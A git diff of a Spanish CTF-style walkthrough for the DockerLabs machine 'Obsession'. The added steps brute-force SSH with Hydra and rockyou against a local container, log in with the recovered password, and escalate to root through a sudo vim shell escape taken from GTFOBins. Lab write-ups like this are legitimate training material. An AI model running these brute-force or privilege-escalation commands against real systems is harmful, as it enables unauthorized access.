@@ -1,5 +1,5 @@
 # Write-up Obsesion
-> Maquina de El pingüino de Mario-Fecha de creación: 25/06/2024 https://dockerlabs.es/
+> Maquina de Juan-Fecha de creación: 25/06/2024 https://dockerlabs.es/
 
 > Fecha de creación del Write-up 20/02/2025
 
@@ -22,18 +22,17 @@ Durante todo el proceso del **Write-up** se demostrará con las diferentes herra
 | Herramientas     | Descripción                       | Versión    |
 |------------------|-----------------------------------|-----------|
 |**Nmap**| Permite descubrir dispositivos en la red, servicios, puertos...           | 7.94SVN  |
-| **Metasploit**   | Permite a través de diferentes componentes de la herramienta buscar exploits para poder aprovecharse de las vulnerabilidades que existan.      | 6.4.34-dev|
-| **Dirb**   | Permite a través de diferentes componentes de la herramienta buscar exploits para poder aprovecharse de las vulnerabilidades que existan.      | 6.4.34-dev|
-| **Ftp**| Permite conectarse al servicio de ftp de la máquina.      | 20230507-2+b1|
-| **ssh**   | Permite a través de diferentes componentes de la herramienta buscar exploits para poder aprovecharse de las vulnerabilidades que existan.      | 6.4.34-dev|
-| **Hydra**   | Permite a través de diferentes componentes de la herramienta buscar exploits para poder aprovecharse de las vulnerabilidades que existan.      | 6.4.34-dev|
+| **Dirb**   | Permite a través de diferentes componentes de la herramienta buscar exploits para poder aprovecharse de las vulnerabilidades que existan.      | v2.22|
+| **Ftp**| Protocolo que permite conectarse al servicio de ftp de la máquina.      | 20230507-2+|
+| **ssh**   | Protocolo que permite conectarse por remoto a otroa máquina.      | OpenSSH_9.9p1 Debian-3, OpenSSL 3.3.2 3 Sep 2024|
+| **Hydra**   | Herramienta que permite hacer pruebas de fuerza bruta indicando los diccionarios de prueba     | v9.5 (c) 2023|
 
 ## Instalación
 
 Antes de empezar deberemos desplegar la máquina vulnerable para que esté disponible durante todo el proceso de intrusión.
 ```bash
 
-#Le damos permisos de ejecución.
+'Le damos permisos de ejecución.'
 
 └─$ sudo chmod +x auto_deploy.sh 
 [sudo] contraseña para alema: 
@@ -68,8 +67,8 @@ Presiona Ctrl+C cuando termines con la máquina para eliminarla
 
 Ahora que la máquina ya esta disponible, pasaremos a comprobar qué servicios y puertos tiene abiertos a la red.
 
-```
-#Deberemos de utilizar la herramienta Nmap con el parámetro -A para que compruebe puertos,servicios,scripts...
+```bash
+'Deberemos de utilizar la herramienta Nmap con el parámetro -A para que compruebe puertos,servicios,scripts...'
 
 ┌──(alema㉿alema)-[~/Escritorio/dockerlabs/Muy_facil/obsession]
 └─$ sudo nmap -A 172.17.0.2 
@@ -123,9 +122,9 @@ Nmap done: 1 IP address (1 host up) scanned in 21.04 seconds
 
 Tras hacer el escaneo, se puede observar que la máquina  tiene el servicio de ftp con la versión de vsftpd 3.0.5.Dentro de este,se puede ver que hay dos txt accesibles por el usuario Anonymous.
 
-```
+```bash
 
-#Nos conectaremos al servicio con el usuario Anonymous.
+'Nos conectaremos al servicio con el usuario Anonymous.'
 
                                                                                                               
 ┌──(kali㉿kali)-[~]
@@ -138,14 +137,14 @@ Password:
 230 Login successful.
 Remote system type is UNIX.
 Using binary mode to transfer files.
-#Comprobamos los archivos disponibles.
+'Comprobamos los archivos disponibles.'
 ftp> ls
 229 Entering Extended Passive Mode (|||10120|)
 150 Here comes the directory listing.
 -rw-r--r--    1 0        0             667 Jun 18  2024 chat-gonza.txt
 -rw-r--r--    1 0        0             315 Jun 18  2024 pendientes.txt
 226 Directory send OK.
-#Descargamos los archivos disponibles.
+'Descargamos los archivos disponibles.'
 ftp> mget *.txt
 mget chat-gonza.txt [anpqy?]? 
 229 Entering Extended Passive Mode (|||27876|)
@@ -253,6 +252,189 @@ En el directorio "http://172.17.0.2/backup/"
 Aqui dentro hay un txt que indica el usuario por defecto que utiliza la victima para los servicios.
 
 ![image](https://github.com/user-attachments/assets/cdd32666-5577-4f0c-b27a-c80b0864a101)
+
+Si volveemos a revisar el nmap,podemos ver que tiene un servicio de ssh,asi que probaremos este usuario con la herramienta Hydra.
+
+```bash  
+'Utilizamos el parametro -vV para poder ver los resultados que prueba.'
+┌──(alema㉿alema)-[~]
+└─$ sudo hydra -l russoski  -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ssh  -vV
+
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-22 10:25:28
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://172.17.0.2:22/
+[VERBOSE] Resolving addresses ... [VERBOSE] resolving done
+[INFO] Testing if password authentication is supported by ssh://russoski@172.17.0.2:22
+[INFO] Successful, password authentication is supported by ssh://172.17.0.2:22
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "123456" - 1 of 14344399 [child 0] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "12345" - 2 of 14344399 [child 1] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "123456789" - 3 of 14344399 [child 2] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "password" - 4 of 14344399 [child 3] (0/0)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "iloveyou" - 5 of 14344399 [child 4] (0/0)
+[VERBOSE] Disabled child 12 because of too many errors
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "654321" - 17 of 14344400 [child 0] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "michael" - 18 of 14344400 [child 2] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "ashley" - 19 of 14344400 [child 4] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "qwerty" - 20 of 14344400 [child 1] (0/1)
+[ERROR] ssh protocol error
+****************************************TIEMPO DESPUES******************************************
+[VERBOSE] Retrying connection for child 2
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "987654321" - 82 of 14344400 [child 6] (0/1)
+[RE-ATTEMPT] target 172.17.0.2 - login "russoski" - pass "lovers" - 82 of 14344400 [child 2] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "computer" - 83 of 14344400 [child 7] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "whatever" - 84 of 14344400 [child 0] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "dragon" - 85 of 14344400 [child 1] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "vanessa" - 86 of 14344400 [child 10] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "cookie" - 87 of 14344400 [child 4] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "naruto" - 88 of 14344400 [child 5] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "summer" - 89 of 14344400 [child 8] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "sweety" - 90 of 14344400 [child 9] (0/1)
+[VERBOSE] Retrying connection for child 13
+[RE-ATTEMPT] target 172.17.0.2 - login "russoski" - pass "junior" - 101 of 14344400 [child 3] (0/1)
+[VERBOSE] Retrying connection for child 14
+[RE-ATTEMPT] target 172.17.0.2 - login "russoski" - pass "taylor" - 101 of 14344400 [child 13] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "alexis" - 102 of 14344400 [child 1] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "jesus" - 103 of 14344400 [child 7] (0/1)
+[RE-ATTEMPT] target 172.17.0.2 - login "russoski" - pass "yellow" - 103 of 14344400 [child 14] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "estrella" - 104 of 14344400 [child 10] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "miguel" - 105 of 14344400 [child 15] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "william" - 106 of 14344400 [child 4] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "thomas" - 107 of 14344400 [child 8] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "beautiful" - 108 of 14344400 [child 0] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "mylove" - 109 of 14344400 [child 6] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "angela" - 110 of 14344400 [child 2] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "poohbear" - 111 of 14344400 [child 9] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "patrick" - 112 of 14344400 [child 5] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "iloveme" - 113 of 14344400 [child 1] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "sakura" - 114 of 14344400 [child 7] (0/1)
+[ATTEMPT] target 172.17.0.2 - login "russoski" - pass "adrian" - 115 of 14344400 [child 10] (0/1)
+#Despues de un tiempo podemos ver que ha encontrado la contraseña del usuario
+[22][ssh] host: 172.17.0.2   login: russoski   password: iloveme`
+
+[STATUS] attack finished for 172.17.0.2 (waiting for children to complete tests)
+1 of 1 target successfully completed, 1 valid password found
+[WARNING] Writing restore file because 3 final worker threads did not complete until end.
+[ERROR] 3 targets did not resolve or could not be connected
+[ERROR] 0 target did not complete
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-22 10:26:07
+                                                                                     
+```
+Ahora que sabemos la contraseña,entraremos por el servicio ssh.
+
+```bash  
+┌──(alema㉿alema)-[~]
+└─$ ssh russoski@172.17.0.2                                                        
+The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
+ED25519 key fingerprint is SHA256:R8ZiOJN33rhfvGADBLwVQ1mPV7lSmGJACOhjdTB0wMQ.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
+russoski@172.17.0.2's password:
+'Ponemos la contraseña que hemos descubiertos.'
+Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.11.2-amd64 x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/pro
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Tue Jun 18 04:38:10 2024 from 172.17.0.1
+
+'Comprobamos el usuario'
+
+russoski@f97682611d3e:~$ whoami
+russoski
+
+'Listamos el contenido del usuario.'
+
+russoski@f97682611d3e:~$ ls
+Documentos  Proyectos
+russoski@f97682611d3e:~$ cd Proyectos/
+russoski@f97682611d3e:~/Proyectos$ ls
+README.md  Strong-Credentials.py
+russoski@f97682611d3e:~/Proyectos$ cd Documentos
+-bash: cd: Documentos: No such file or directory
+russoski@f97682611d3e:~/Proyectos$ cd ..
+russoski@f97682611d3e:~$ cd Documentos/
+
+'Podemos ver la fotografia que hablaba el usuario en el txt del servicio ftp.'
+
+russoski@f97682611d3e:~/Documentos$ ls
+'Nikola Tesla.jpg'
+russoski@f97682611d3e:~/Documentos$ 
+
+                                                                                     
+```
+Si queremos ver la imagen que hablaba al principio el usuario,podriamos descargarla y asi comprobar si es posible la transferencia.
+
+```bash  
+┌──(alema㉿alema)-[~]
+└─$ sudo scp russoski@172.17.0.2:/home/russoski/Documentos/"Nikola Tesla.jpg" /home/alema 
+[sudo] contraseña para alema: 
+The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
+ED25519 key fingerprint is SHA256:R8ZiOJN33rhfvGADBLwVQ1mPV7lSmGJACOhjdTB0wMQ.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
+russoski@172.17.0.2's password: 
+Nikola Tesla.jpg                                                                                                                                                                                         100%  140KB  10.7MB/s   00:00    
+                   
+                                                                                     
+```
+La imagen "Comprometida" es la siguiente:
+
+![image](https://github.com/user-attachments/assets/f30d37cb-ca68-41c2-abcd-93beec30b5a2)
+
+
+
+
+Ahora para continuar, deberemos ver los permisos que tiene el usuario y si es posible elevar privilegios.
+
+```bash  
+'Con el siguiente comando podemos ver si el usuario en el que estamos,tiene algun tipo de permiso.'
+
+russoski@f97682611d3e:~/Documentos$ sudo -l
+Matching Defaults entries for russoski on f97682611d3e:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User russoski may run the following commands on f97682611d3e:
+    (root) NOPASSWD: /usr/bin/vim
+russoski@f97682611d3e:~/Documentos$ 
+
+```
+
+Si nos fijamos en el resultado, podemos ver que tiene permisos con la herramienta vim.Tras saber esto,podemos consultar en la pagína GTFObins para ver que tipo  de vulnerabilidades existen para poder elevar permisos.
+
+
+![image](https://github.com/user-attachments/assets/16557a55-297a-45ff-9d57-b2bbe93fbf67)
+
+
+En este apartado,deberemos entrar en el apartado de "sudo" y comprobar que podemos hacer.Si leemos los diferentes apartados,podemos ver que hay un comando para entrar a una shell interactica dentro de vim.
+
+![image](https://github.com/user-attachments/assets/407b58fd-0333-41f5-9c78-84eb574b268a)
+
+Si utilizamos esto dentro del ssh,podremos ver que si que podemos entrar como root.
+
+```bash  
+russoski@f97682611d3e:~/Documentos$ sudo vim -c ':!/bin/sh'
+
+# whoami
+root
+
+
+```
+
+Con esto se da por acabado la intrusión a la maquina obsession
+
+
+
 
 
 
